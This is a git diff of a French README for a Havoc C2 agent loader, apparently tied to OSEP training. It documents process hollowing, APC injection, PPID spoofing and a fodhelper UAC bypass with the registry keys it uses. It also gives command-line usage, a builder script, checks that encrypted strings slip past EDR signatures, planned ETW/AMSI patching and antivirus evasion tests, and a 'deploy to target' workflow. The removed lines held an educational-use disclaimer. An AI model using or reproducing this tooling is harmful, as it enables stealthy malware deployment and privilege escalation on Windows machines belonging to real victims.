@@ -2,6 +2,64 @@
 
 Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des processus Windows via **process hollowing**, **injection directe**, ou **UAC bypass**.
 
+---
+
+## 📊 Milestones & Roadmap
+
+### ✅ Phase 1: Core Functionality (COMPLÈTE)
+- [x] Process Hollowing (PE x64)
+- [x] APC Injection (smart PE/shellcode detection)
+- [x] UAC Bypass via fodhelper
+- [x] PPID Spoofing
+- [x] AES-256-CBC Encryption
+- [x] Anti-Analysis Checks (virtualization + timing)
+- [x] 4 Injection Modes (DEFAULT/HOLLOW/APC/UAC)
+- [x] Config-driven EDR String Encryption
+- [x] Automated Builder (builder.sh)
+- [x] Meterpreter Reverse HTTPS Testing ✅ **VALIDATED**
+
+### 🔄 Phase 2: OPSEC Enhancement (EN COURS)
+- [ ] Polymorphic RC4 Decryption (Shoggoth-inspired)
+- [ ] Direct Syscalls (NtCreateProcess, NtWriteVirtualMemory, etc)
+- [ ] ETW Patching (EtwEventWrite + AMSI)
+- [ ] API Obfuscation (hash-based GetProcAddress)
+- [ ] Behavioral Evasion (jitter, chunk writes, delays)
+- [ ] SysWhispers2 Integration
+
+### 📋 Phase 3: Additional Features (PLANIFIÉE)
+- [ ] DLL Loader (Reflective DLL Injection)
+- [ ] COFF Loader (Beacon Object Files)
+- [ ] Indirect Syscalls (more furtive)
+- [ ] Code Obfuscation (dead code, polymorphic patterns)
+- [ ] Memory Cleanup (ZeroMemory critical buffers)
+- [ ] Advanced Anti-Debugging
+
+### 🎯 Phase 4: Testing & Validation (À VENIR)
+- [ ] Defender Evasion Rate Test
+- [ ] Avira Evasion Rate Test
+- [ ] VirusTotal Multi-AV Detection
+- [ ] ProcessMonitor Baseline (zero API calls)
+- [ ] Memory Forensics Analysis
+- [ ] Behavioral Detection Tests
+
+---
+
+## 📈 Current Status
+
+| Component | Status | Last Tested |
+|-----------|--------|-------------|
+| **Process Hollowing** | ✅ Working | 2025-12-30 |
+| **APC Injection** | ✅ Working | 2025-12-30 |
+| **UAC Bypass** | ✅ Working | 2025-12-30 |
+| **PPID Spoofing** | ✅ Working | 2025-12-30 |
+| **Meterpreter Integration** | ✅ Session Live | 2025-12-30 |
+| **String Encryption** | ✅ Verified | 2025-12-30 |
+| **Direct Syscalls** | 🔄 In Development | — |
+| **Polymorphic Encryption** | 🔄 In Development | — |
+| **ETW Patching** | 🔄 In Development | — |
+
+---
+
 ## 🎯 Fonctionnalités
 
 - 🔐 **Chiffrement AES-256-CBC** avec seed aléatoire de 42 bytes + PBKDF2
@@ -14,49 +72,64 @@ Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des 
 
 ## 📋 Usage Rapide
 
-### Mode Process Hollowing (défaut)
+### Mode DEFAULT (Spawn svchost + APC)
 ```bash
-# Créer svchost.exe suspendu et injecter le PE
-.\loader.exe -v -h
+# Défaut: crée svchost et injecte via APC (aucun flag)
+.\loader.exe -v
+
+# Avec PPID spoofing
+.\loader.exe --ppid 500 -v
+
+# Avec anti-analysis checks
+.\loader.exe -a -v
+```
+
+### Mode HOLLOW (Process Hollowing)
+```bash
+# Hollowing svchost (défaut)
+.\loader.exe -m hollow -v
 
 # Hollowing avec cible personnalisée
-.\loader.exe -v -h -f notepad.exe
-.\loader.exe -v -h -f C:\Windows\calc.exe
+.\loader.exe -m hollow -f notepad.exe -v
+.\loader.exe -m hollow -f C:\Windows\System32\calc.exe -v
 
-# Avec PPID spoofing (le processus paraît venir du PID 500)
-.\loader.exe -v -h --ppid 500
+# Avec PPID spoofing
+.\loader.exe -m hollow --ppid 500 -v
 ```
 
-### Mode APC Injection (existing process)
+### Mode APC (Existing Process Injection)
 ```bash
-# Injection directe dans un processus existant (PID 1464)
-# Détecte automatiquement si c'est PE ou shellcode
-.\loader.exe -p 1464 -v
+# Injection dans processus existant (PID 1464)
+# Détecte automatiquement PE ou shellcode
+.\loader.exe -m apc -p 1464 -v
 ```
 
-### Mode UAC Bypass
+### Mode UAC (Privilege Escalation)
 ```bash
-# Élévation via fodhelper (fodhelper relance le loader)
-.\loader.exe -u -v -h -f svchost.exe
+# UAC bypass avec commande custom
+.\loader.exe -m uac -c "calc.exe" -v
+
+# UAC bypass: re-lance loader sans flag UAC (en mode DEFAULT élevé)
+.\loader.exe -m uac -v
 ```
 
 ### Options Complètes
 ```
+-m, --mode MODE         hollow|apc|uac (défaut: none = DEFAULT mode)
 -v, --verbose           Logs détaillés de debug
--h, --hollow            Process hollowing (défaut)
 -f, --file PATH         Cible du hollowing (défaut: svchost.exe)
 -p, --pid PID           APC injection dans processus existant
---ppid PPID             PPID spoofing (nécessite admin)
--u, --uac               UAC bypass via fodhelper
+--ppid PPID             PPID spoofing (défaut parent)
+-c, --cmd COMMAND       Commande custom pour UAC mode
 -a, --anti              Anti-analysis checks (auto avec -v)
---help                  Aide
+-h, --help              Aide
 ```
 
 ## 🏗️ Architecture & Flux d'Exécution
 
 ### Phase 1: Initialisation
 ```
-[Chiffrement] 
+[Chiffrement]
   ├─ Seed 42 bytes (aléatoire)
   ├─ Clé PBKDF2 32 bytes
   └─ IV 16 bytes
@@ -130,7 +203,7 @@ PE Payload (MZ header):
   4d5a90000300000004000000ffff0000...
   ↓ MZ + PE signature
   → Injection PE complète (sections, relocations, PEB)
-  
+
 Raw Shellcode (code machine):
   564889e64883e4f04883ec20e80f0000...
   ↓ Pas de signature
@@ -239,25 +312,151 @@ x86_64-w64-mingw32-g++ -std:c++17 -Wall -O2 \
   -o loader.exe -lkernel32 -lntdll -ladvapi32 -lshell32 -lole32
 ```
 
-## 🔐 Chiffrement du Payload
+## �️ EDR Evasion - Strings Chiffrées
 
-### Génération
+Toutes les strings sensibles sont **chiffrées en AES-256** et déchiffrées **inline au runtime**:
+
+### Strings Protégées
+| String | Valeur | Protection |
+|--------|--------|-----------|
+| `registry_path_enc` | `Software\Classes\ms-settings\shell\open\command` | ✅ AES-256 |
+| `delegate_execute_enc` | `DelegateExecute` | ✅ AES-256 |
+| `shell_verb_enc` | `open` | ✅ AES-256 |
+| `default_process_enc` | `C:\Windows\System32\svchost.exe` | ✅ AES-256 |
+| `fodhelper_path_enc` | `C:\Windows\System32\fodhelper.exe` | ✅ AES-256 |
+
+### Gestion
 ```bash
-python3 myenc.py <payload.bin> <seed.bin>
-# Génère: demon.x64.h avec payload_enc
+# Config: edr_strings.conf
+fodhelper_path:C:\Windows\System32\fodhelper.exe
+registry_path:Software\Classes\ms-settings\shell\open\command
+delegate_execute:DelegateExecute
+shell_verb:open
+default_process:C:\Windows\System32\svchost.exe
 ```
 
-### Format
-```
-payload_enc: [seed (42 bytes) + ciphertext]
-payload_enc_len: Longueur totale
+### Vérification Anti-Détection
+```bash
+# Les strings ne doivent PAS être en clair
+strings loader.exe | grep -i "DelegateExecute"    # ✅ Vide
+strings loader.exe | grep -i "Software"           # ✅ Vide
+strings loader.exe | grep -i "ms-settings"        # ✅ Vide
 ```
 
-### Déchiffrement Runtime
+## � Builder Automatisé
+
+### Flux Complet (builder.sh)
+
+Le script **builder.sh** automatise l'ensemble du process:
+
+```bash
+# Usage: ./builder.sh <payload> <output_exe> <architecture>
+./builder.sh demon.x64.exe loader.exe x64
+
+# Ou avec chemins complets
+./builder.sh /path/to/payload.bin ./loader.exe x64
 ```
-1. Read seed (42 bytes)
-2. PBKDF2(seed) → key (32b) + iv (16b)
-3. AES-256-CBC-decrypt(ciphertext, key, iv)
+
+**Étapes exécutées automatiquement:**
+
+1. **Chiffrement du payload**
+   ```
+   python3 myenc.py <payload>
+   ↓ Génère: demon.x64.h (payload_enc + strings chiffrées)
+   ```
+
+2. **Chiffrement des strings EDR** (via edr_strings.conf)
+   ```
+   edr_strings.conf → myenc.py → demon.x64.h
+   ├─ fodhelper_path
+   ├─ registry_path
+   ├─ delegate_execute
+   ├─ shell_verb
+   └─ default_process
+   ```
+
+3. **Compilation du loader**
+   ```
+   g++ -std:c++17 -Wall -O2 \
+     *.cpp -o loader.exe \
+     -lkernel32 -lntdll -ladvapi32 -lshell32 -lole32
+   ```
+
+4. **Résultat**
+   ```
+   loader.exe (~453 KB) avec:
+   ✅ Payload chiffré en AES-256
+   ✅ Strings EDR chiffrées
+   ✅ Aucune signature plaintext
+   ```
+
+### Configuration des Strings EDR
+
+**Fichier:** `edr_strings.conf`
+```ini
+fodhelper_path:C:\Windows\System32\fodhelper.exe
+registry_path:Software\Classes\ms-settings\shell\open\command
+delegate_execute:DelegateExecute
+shell_verb:open
+default_process:C:\Windows\System32\svchost.exe
+```
+
+**Modification:** Éditer avant de lancer builder.sh
+```bash
+# Ajouter une nouvelle string
+echo "new_var:C:\path\to\something" >> edr_strings.conf
+
+# Puis relancer le builder
+./builder.sh demon.x64.exe loader.exe x64
+```
+
+## 🔐 Chiffrement du Payload & Strings
+
+### Format du Chiffrement
+
+**Payload** (avec seed):
+```
+[seed (42 bytes - aléatoire)] + [ciphertext AES-256-CBC]
+```
+
+**Strings EDR** (sans seed - utilise seed du payload):
+```
+[ciphertext AES-256-CBC uniquement]
+```
+
+### Processus de Déchiffrement Runtime
+
+```
+Phase 1: Déchiffrement du payload
+  ├─ Read seed (42 bytes)
+  ├─ PBKDF2(seed) → key (32b) + iv (16b)
+  └─ AES-256-CBC decrypt → Payload plaintext
+
+Phase 2: Déchiffrement inline des strings EDR
+  ├─ easCipher42 utilise même key/iv
+  ├─ Déchiffre registry_path à la demande (UAC mode)
+  ├─ Déchiffre delegate_execute à la demande
+  ├─ Déchiffre shell_verb à la demande
+  ├─ Déchiffre default_process à la demande
+  └─ Déchiffre fodhelper_path à la demande (UAC mode)
+```
+
+### Exemple: Déchiffrement Inline (uac_bypass.cpp)
+
+```cpp
+// Constructor reçoit easCipher42 par référence
+UACBypass(const std::string& cmd,
+          const uint8_t* fh_enc, size_t fh_enc_size,
+          easCipher42& cipher, bool verbose)
+
+// À l'exécution:
+std::vector<uint8_t> registry_path_plain =
+  cipher.decrypt(registry_path_enc, registry_path_enc_len);
+// → "Software\Classes\ms-settings\shell\open\command"
+
+std::vector<uint8_t> delegate_execute_plain =
+  cipher.decrypt(delegate_execute_enc, delegate_execute_enc_len);
+// → "DelegateExecute"
 ```
 
 ## 🐛 Debugging
@@ -285,240 +484,96 @@ Affiche:
 [+] SUCCESS                             ← Exécution ok
 ```
 
----
+## 🚨 Vérification Anti-Signature
 
-**Version:** 2.0 | **Date:** 2025-12-30 | **Support:** PE x64 + Auto-detect payload
-
-## Fonctionnalités
-
-- 🔐 **Chiffrement AES-256-CBC** avec seed aléatoire de 42 bytes
-- 💉 **Process Hollowing** : Remplace l'image d'un processus suspendu par votre PE
-- 🪡 **APC Injection** : Injection via thread distant dans un processus existant
-- 🛡️ **Anti-Analysis** : Détection virtualization + vérification timing
-- 🔄 **Gestion des relocations** : Fixe automatiquement les adresses si ImageBase change
-
-## Usage
+### Avant et Après Chiffrement
 
 ```bash
-# Process Hollowing (défaut)
-.\loader.exe -h -v
+# AVANT (strings plaintext)
+strings demon.x64.exe | grep -i "DelegateExecute"
+# Result: DelegateExecute (à éviter!)
 
-# APC Injection dans un processus existant
-.\loader.exe -p 1234 -v
+# APRÈS (avec builder.sh)
+strings loader.exe | grep -i "DelegateExecute"
+# Result: (vide - chiffré ✅)
 
-# UAC Bypass via fodhelper
-.\loader.exe -u -v
+strings loader.exe | grep -i "Software"
+# Result: (vide - chiffré ✅)
 
-# Verbose uniquement
-.\loader.exe -v
+strings loader.exe | grep -i "ms-settings"
+# Result: (vide - chiffré ✅)
 ```
 
-### Options
-- `-h, --hollow` : Mode process hollowing (crée notepad/fodhelper)
-- `-p, --pid PID` : APC injection dans processus existant (PID en décimal)
-- `-u, --uac` : UAC bypass via fodhelper
-- `-v, --verbose` : Logs détaillés de debug
-
-## Flux d'exécution
-
-### Process Hollowing (`-h`)
-1. **Création processus** : Lance notepad/fodhelper en état suspendu
-2. **Parsage PE** : Lit les headers du payload chiffré
-3. **Allocation mémoire** : VirtualAllocEx à l'ImageBase du PE
-4. **Injection sections** : Écrit headers + toutes les sections
-5. **Relocations** : Fixe les références si ImageBase != attendu
-6. **PEB update** : Modifie ImageBase dans la structure PEB
-7. **Contexte thread** : Définit RCX au EntryPoint
-8. **Reprise** : ResumeThread() → payload s'exécute
-
-### APC Injection (`-p`)
-1. **Ouverture processus** : OpenProcess(PROCESS_ALL_ACCESS, PID)
-2. **Allocation** : Mémoire exécutable pour le shellcode
-3. **Écriture** : WriteProcessMemory du payload
-4. **Thread distant** : CreateRemoteThread à l'adresse du payload
-5. **Attente** : WaitForSingleObject(10s timeout)
-
-### UAC Bypass (`-u`)
-1. **Registry hijacking** : Modifie clés MS-Settings
-2. **Fodhelper relance** : ShellExecuteA avec "open" (auto-elevation)
-3. **Réexécution** : Loader relancé avec droits admin
-
-## Restrictions du Process Hollowing
-
-### ⚠️ Droits Administrateur OBLIGATOIRES
-**Pourquoi ?** Le process hollowing modifie directement l'espace mémoire d'un processus. Windows protège cette opération.
-
-**Erreur** : `ERROR_ELEVATION_REQUIRED (740)`
-```
-[-] CreateProcessW failed: error 740
-```
-
-**Solution** :
-- Exécuter en tant qu'administrateur
-- Ou utiliser le UAC bypass (`-u`) au préalable
-
-### 🎯 Cible de Processus
-**Restrictions** :
-- **Ne peut pas** : Services système (svchost, lsass, csrss)
-- **Peut** : notepad, calc, explorer, cmd, etc.
-- **Actuellement configuré** : Utilise l'exe spécifié dans le code
-
-**Impact** : Processus sans droits = injection moins discrète
-
-### 📦 Format du Payload
-**OBLIGATOIRE** : PE valide (x86 ou x64)
-- Headers DOS + PE valides
-- Sections alignées
-- Table de relocations (optionnel mais recommandé)
-
-**NON supporté** :
-- Shellcode brut sans headers PE
-- DLL (nécessite relocation avancée)
-- Payloads corrompus
-
-### 🔄 Table de Relocations
-
-**Fonctionnement** :
-```
-Payload ImageBase: 0x140000000
-Memory alloué à:    0x7FFF0000
-Delta = 0x7FFF0000 - 0x140000000 → Nécessite relocation
-```
-
-**Si ImageBase indisponible** :
-- ✅ Allocation dynamique activée
-- ✅ Table .reloc correctement appliquée
-- ⚠️ Code mal écrit peut crasher si pas de relocations
-
-**Vérification** :
-```cpp
-// Dans le code
-lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
-```
-
-### 🚨 Exceptions/Limitations Connues
-
-| Restriction | Raison | Contournement |
-|------------|--------|----------------|
-| Pas d'admin | Accès mémoire refusé | UAC bypass ou ElimateToken |
-| ImageBase occupée | Adresse déjà en use | Relocation appliquée auto |
-| Pas de table reloc | Crash probable | Générer PE avec compilateur modern |
-| ASLR activé | Adresses aléatoires | Relocation gère ça automatiquement |
-| DEP/NX enabled | Exécution bloquée | PAGE_EXECUTE_READWRITE l'active |
-| ETW hooked | Détection possible | ObfuscateAPI ou direct syscalls |
-
-### 🛡️ Détections Possibles
-
-**Niveau User** :
-- ProcessMonitor voit CreateProcessW + WriteProcessMemory
-- Autoruns détecte les processus injected
-
-**Niveau Kernel** :
-- ETW (Event Tracing for Windows) enregistre les APIs
-- Minifilter driver détecte les accès mémoire anormaux
-- EDR/AV détecte les pattern d'injection connus
-
-### ✅ Checklist Avant Exploitation
-
-```
-[x] Payload PE valide généré
-[x] Headers correct (MZ + PE)
-[x] Sections complètes
-[x] Table reloc présente (fortement recommandé)
-[x] ImageBase cohérent (0x140000000 par défaut pour x64)
-[x] Droits administrateur actifs
-[x] Pas d'EDR/AV détectant
-[x] Cible de processus accessible
-[x] Chiffrement AES-256 appliqué
-[ ] Test en environnement isolé
-```
-
-## Architecture Technique
-
-### Chiffrement
-```
-Plaintext: [SEED (42b)] + [Payload encrypté en AES-CBC]
-                 ↓
-           PBKDF2(SEED) → Key (32b) + IV (16b)
-                 ↓
-           AES-256-CBC encrypt
-                 ↓
-           Ciphertext binaire
-```
-
-### Injection (Hollowing)
-```
-Payload PE
-    ↓
-Parse Headers
-    ↓
-Créer Processus Suspendu
-    ↓
-Allouer Mémoire (ImageBase ou dynamique)
-    ↓
-Écrire Headers + Sections
-    ↓
-Fixer Relocations
-    ↓
-Update PEB ImageBase
-    ↓
-SetThreadContext(RCX → EntryPoint)
-    ↓
-ResumeThread()
-    ↓
-Payload Exécution
-```
-
-## Fichiers Clés
-
-| Fichier | Rôle |
-|---------|------|
-| `havoc_loader_main.cpp` | Point d'entrée, parsing arguments |
-| `process_hollower.cpp` | Logique du process hollowing |
-| `process_injection.cpp` | CreateRemoteThread injection |
-| `easCipher42.cpp` | Déchiffrement AES-256-CBC |
-| `bypass_analysis.cpp` | Anti-VM + checks timing |
-| `uac_bypass.cpp` | UAC elevation via fodhelper |
-| `myenc.py` | Script de chiffrement/génération demon.x64.h |
-
-## Compilation
+### Vérification Complète
 
 ```bash
-# Windows avec MSVC
-cl.exe /std:c++17 havoc_loader_main.cpp havoc_loader.cpp \
-       process_hollower.cpp process_injection.cpp \
-       easCipher42.cpp crypto_funcs.cpp bypass_analysis.cpp \
-       uac_bypass.cpp /link kernel32.lib ntdll.lib
+#!/bin/bash
+echo "=== Vérification signatures EDR ==="
+for sig in "DelegateExecute" "Software" "ms-settings" "fodhelper" "svchost"; do
+  count=$(strings loader.exe | grep -ci "$sig")
+  if [ $count -eq 0 ]; then
+    echo "[✅] $sig: Chiffré"
+  else
+    echo "[-] $sig: PLAINTEXT (non chiffré!)"
+  fi
+done
 ```
 
-## Génération du Payload
+## 🔗 Intégration Complète
+
+### Workflow Standard
+
+```
+1. Générer/Obtenir payload Havoc
+   demon.x64.exe ou demon.x64.bin
+
+2. Éditer configuration strings EDR
+   vim edr_strings.conf
+
+3. Lancer builder automatisé
+   ./builder.sh demon.x64.exe loader.exe x64
+
+4. Vérifier absence signatures
+   strings loader.exe | grep -i "DelegateExecute"  # Doit être vide
+
+5. Déployer loader.exe
+   Transférer vers cible Windows
+
+6. Exécuter injection
+   ./loader.exe -m hollow -v  # Ou autre mode
+```
+
+### Exemple Complet
 
 ```bash
-# Générer demon.x64.h à partir d'un PE
-python3 myenc.py -i payload.bin
+#!/bin/bash
+set -e
 
-# Ou générer + sauvegarder le chiffré
-python3 myenc.py -i payload.bin -o encrypted.bin
+PAYLOAD="demon.x64.exe"
+OUTPUT="loader_final.exe"
+
+echo "[*] Étape 1: Configuration strings EDR"
+cat > edr_strings.conf << EOF
+fodhelper_path:C:\Windows\System32\fodhelper.exe
+registry_path:Software\Classes\ms-settings\shell\open\command
+delegate_execute:DelegateExecute
+shell_verb:open
+default_process:C:\Windows\System32\svchost.exe
+EOF
+
+echo "[*] Étape 2: Lancer builder"
+./builder.sh "$PAYLOAD" "$OUTPUT" x64
+
+echo "[*] Étape 3: Vérification signatures"
+if strings "$OUTPUT" | grep -iq "DelegateExecute"; then
+    echo "[-] ERREUR: DelegateExecute en plaintext!"
+    exit 1
+fi
+
+echo "[+] Build réussi: $OUTPUT"
+ls -lh "$OUTPUT"
 ```
-
-## Limitations Connues
-
-1. **Nécessite Admin** pour le hollowing standard
-2. **Payload PE obligatoire** (pas de shellcode brut)
-3. **Pas de support x86 réel** (code x64 seulement actuellement)
-4. **ETW peut détecter** l'injection en environnement sécurisé
-5. **UAC bypass dépassé** sur Windows 10/11 récent
-
-## Améliorations Futures
-
-- [ ] Support x86 natif
-- [ ] Obfuscation des imports
-- [ ] Syscalls directs (NtCreateProcess, etc)
-- [ ] Injection dans .NET assemblies
-- [ ] Memory-only execution (pas de fichier disque)
-- [ ] Callback chains pour éviter détection
 
 ---
 
-**Auteur** : OSEP Training
-**Disclaimer** : À usage pédagogique et de test d'autorisation uniquement
+**Version:** 2.0 | **Date:** 2025-12-30 | **Support:** PE x64 + 4 modes d'injection
